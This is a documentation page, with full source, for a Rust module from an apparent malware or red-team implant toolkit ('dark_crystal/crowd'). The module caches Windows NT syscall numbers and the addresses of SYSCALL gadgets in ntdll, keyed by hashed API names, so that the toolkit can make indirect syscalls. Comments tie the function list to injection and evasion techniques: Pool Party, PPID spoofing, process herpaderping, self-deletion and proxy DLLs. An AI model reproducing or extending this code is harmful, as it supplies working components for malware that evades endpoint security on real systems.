# crowd — syscall_map.rs  (✅ C TIER — SSN cache infrastructure)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/syscall_map.rs` |
| **Lines** | 95 |
| **Tier** | S |
| **Cards** | T004-syscall-dispatch |
| **Role** | Syscall map |

## Purpose

# crowd — syscall_map.rs  (✅ C TIER — SSN cache infrastructure)

Static OnceLock syscall map: (DJB2 hash) → (SSN, gadget address).
Verbatim from killaofking/crates/core/src/sysindirect_map.rs
without the `obf!` macro (strings are compile-time literals hashed once).

## Public API

### `syscall_map` (line 14)
```rust
pub fn syscall_map() -> &'static HashMap<u32, (u32, usize)>
```
Returns a reference to the static syscall map.
Initialized once on first call; all subsequent calls return the cached map.

### `get_ssn_and_gadget` (line 83)
```rust
pub fn get_ssn_and_gadget(hash: u32) -> Option<(u32, usize)>
```
Get SSN + gadget address for a function by hash.

### `get_ssn` (line 88)
```rust
pub fn get_ssn(hash: u32) -> Option<u32>
```
Get only SSN.

### `get_gadget` (line 93)
```rust
pub fn get_gadget(hash: u32) -> Option<usize>
```
Get only the gadget address (SYSCALL instruction inside ntdll).

## Full Source

```rust
//! # crowd — syscall_map.rs  (✅ C TIER — SSN cache infrastructure)
//!
//! Static OnceLock syscall map: (DJB2 hash) → (SSN, gadget address).
//! Verbatim from killaofking/crates/core/src/sysindirect_map.rs
//! without the `obf!` macro (strings are compile-time literals hashed once).

#![allow(dead_code)]

use std::collections::HashMap;
use std::sync::OnceLock;

/// Returns a reference to the static syscall map.
/// Initialized once on first call; all subsequent calls return the cached map.
pub fn syscall_map() -> &'static HashMap<u32, (u32, usize)> {
    static MAP: OnceLock<HashMap<u32, (u32, usize)>> = OnceLock::new();
    MAP.get_or_init(|| {
        let mut m = HashMap::new();

        // All NT functions the chain needs.
        // In production these could be runtime-obfuscated; here they are
        // hashed at init time and never stored as plaintext after that.
        let api_names: &[&str] = &[
            "NtAllocateVirtualMemory",
            "NtAllocateVirtualMemoryEx",
            "NtWriteVirtualMemory",
            "NtReadVirtualMemory",
            "NtProtectVirtualMemory",
            "NtFreeVirtualMemory",
            "NtCreateThreadEx",
            "NtCreateSection",
            "NtMapViewOfSection",
            "NtUnmapViewOfSection",
            "NtQueueApcThread",
            "NtOpenProcess",
            "NtQueryInformationProcess",
            "NtRemoveProcessDebug",
            "NtTerminateProcess",
            "NtClose",
            "NtCreateProcessEx",
            "NtResumeThread",
            "NtSuspendThread",
            "NtDelayExecution",
            "NtSetContextThread",
            "NtGetContextThread",
            "NtSetInformationProcess",
            "NtQuerySystemInformation",
            // Pool Party
            "NtDuplicateObject",
            "NtQueryObject",
            "NtSetInformationWorkerFactory",
            "NtReleaseWorkerFactoryWorker",
            // NTFS EA
            "NtSetEaFile",
            "NtQueryEaFile",
            // Security
            "NtSetSecurityObject",
            // File
            "NtOpenFile",
            // Process creation (PPID spoof)
            "NtCreateUserProcess",
            // File I/O (herpaderping, self-delete)
            "NtWriteFile",
            "NtSetInformationFile",
            "NtFlushBuffersFile",
            // Synchronization (proxy_dll, event signaling)
            "NtCreateEvent",
            "NtSetEvent",
            "NtWaitForSingleObject",
        ];

        for name in api_names {
            let hash = crate::resolve::compute_hash(name);
            let (ssn, gadget) = crate::resolve::resolve_ssn(name);
            if ssn != 0 && gadget != 0 {
                m.insert(hash, (ssn, gadget));
            }
        }
        m
    })
}

/// Get SSN + gadget address for a function by hash.
pub fn get_ssn_and_gadget(hash: u32) -> Option<(u32, usize)> {
    syscall_map().get(&hash).copied()
}

/// Get only SSN.
pub fn get_ssn(hash: u32) -> Option<u32> {
    syscall_map().get(&hash).map(|(ssn, _)| *ssn)
}

/// Get only the gadget address (SYSCALL instruction inside ntdll).
pub fn get_gadget(hash: u32) -> Option<usize> {
    syscall_map().get(&hash).map(|(_, g)| *g)
}

```